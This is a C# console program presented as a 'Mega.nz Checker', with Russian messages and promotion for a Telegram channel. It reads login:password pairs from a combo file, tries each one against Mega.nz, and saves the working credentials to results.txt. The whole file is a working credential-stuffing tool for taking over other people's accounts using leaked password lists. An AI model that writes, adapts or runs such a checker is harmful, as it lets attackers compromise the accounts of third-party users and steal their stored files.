using CG.Web.MegaApiClient;
using System;
using System.IO;
using System.Text;
using System.Threading.Tasks;

namespace MegaNzChecker
{
    class Program
    {

        public static void Main(string[] args)
        {
            bool results = !File.Exists("results.txt");
            if (results)
            {
                File.Create("results.txt");
            }

            Console.Title = string.Format("Mega.nz Checker v1 by VoX DoX | @End_Soft");
            Program.title();

            Program.checkFile();
        }

        private static void title()
        {
            Console.WriteLine();
            Console.WriteLine(" ╔═╗╔═╗─────────────────╔═══╦╗───────╔╗         ");
            Console.WriteLine(" ║║╚╝║║─────────────────║╔═╗║║───────║║		  ");
            Console.WriteLine(" ║╔╗╔╗╠══╦══╦══╗╔═╗╔═══╗║║─╚╣╚═╦══╦══╣║╔╦══╦═╗  ");
            Console.WriteLine(" ║║║║║║║═╣╔╗║╔╗║║╔╗╬══║║║║─╔╣╔╗║║═╣╔═╣╚╝╣║═╣╔╝  ");
            Console.WriteLine(" ║║║║║║║═╣╚╝║╔╗╠╣║║║║══╣║╚═╝║║║║║═╣╚═╣╔╗╣║═╣║   ");
            Console.WriteLine(" ╚╝╚╝╚╩══╩═╗╠╝╚╩╩╝╚╩═══╝╚═══╩╝╚╩══╩══╩╝╚╩══╩╝   ");
            Console.WriteLine(" ────────╔═╝║								      ");
            Console.WriteLine(" ────────╚══╝	by VoX DoX | https://t.me/End_Soft");
            Console.WriteLine();

        }

        private static void checkFile()
        {
            if (File.Exists("combo.txt"))
            {
                string combo = File.ReadAllText("combo.txt");
                if (combo != "")
                {
                    string[] lines = File.ReadAllLines("combo.txt");

                    foreach (string line in lines)
                    {
                        total++;
                    }
                    Logger.Printf("Загружено аккаунтов " + total.ToString(), Logger.Type.DEBUG);
                    Logger.Printf("Продолжаем? (y/n)", Logger.Type.DEBUG);
                    string answer = Console.ReadLine().ToLower();

                    if (answer == "y")
                    {
                        Program.checkAccount();
                    }
                    else if (answer == "n")
                    {
                        Logger.Printf("Всего вам хорошего!", Logger.Type.DEBUG);
                        Console.ReadLine();
                    }
                    else
                    {
                        Logger.Printf("Ты ишак, знай это!", Logger.Type.WARNING);
                        Console.ReadLine();
                    }
                }
                else
                {
                    Logger.Printf("Необнаружено ни одной строчки login:password!", Logger.Type.WARNING);
                    Console.ReadLine();
                }
            }
            else
            {
                Logger.Printf("Создайте файл combo.txt и залейте туда login:password!", Logger.Type.WARNING);
                Console.ReadLine();
            }
        }

        private static void checkAccount()
        {
            if (!File.Exists("invalid.txt"))
            {
                File.Create("invalid.txt");
            }

            using (FileStream fileStream = File.OpenRead("combo.txt"))
            {
                using (StreamReader streamReader = new StreamReader(fileStream, Encoding.UTF8, true, 128))
                {
                    string line;
                    while ((line = streamReader.ReadLine()) != null)
                    {
                        string[] split = line.Split(new char[] { ':' });
                        string login = split[0];
                        string password = split[1];

                        MegaApiClient client = new MegaApiClient();
                        try
                        {
                            client.Login(login, password);
                            if (!client.IsLoggedIn)
                            {
                                Logger.Printf("[-] невалид " + login + ":" + password, Logger.Type.ERROR);
                                File.AppendAllText("invalid.txt", string.Concat(login, ":", password, Environment.NewLine));
                                invalid++;
                            }
                            else
                            {
                                Logger.Printf("[+] валид " + login + ":" + password, Logger.Type.SUCCESS);
                                File.AppendAllText("results.txt", string.Concat(login, ":", password, Environment.NewLine));

                                valid++;
                                Console.Title = string.Format("Mega.nz Checker v1 by VoX DoX | @End_Soft >> VALID: {0}", valid);
                            }
                        }
                        catch
                        {
                            Logger.Printf("[-] невалид " + login + ":" + password, Logger.Type.ERROR);
                            File.AppendAllText("invalid.txt", string.Concat(login, ":", password, Environment.NewLine));
                            invalid++;

                            Console.Title = string.Format("Mega.nz Checker v1 by VoX DoX | @End_Soft >> VALID: {0}", valid);
                        }

                    }

                }
            }
            Console.WriteLine("");
            Logger.Printf("---Mega.nz Checker by VoXDoX---", Logger.Type.DEBUG);
            Logger.Printf(" Валиды: " + Program.valid, Logger.Type.DEBUG);
            Logger.Printf(" Невалиды: " + Program.invalid, Logger.Type.DEBUG);
            Logger.Printf(" Всего проверено: " + total, Logger.Type.DEBUG);
            Logger.Printf("---Mega.nz Checker by VoXDoX---", Logger.Type.DEBUG);
            Console.WriteLine("");
            Logger.Printf("Подпишись: https://t.me/End_Soft", Logger.Type.SUCCESS);
            Console.ReadLine();
        }

        public static int total;
        public static int valid;
        public static int invalid;
    }
}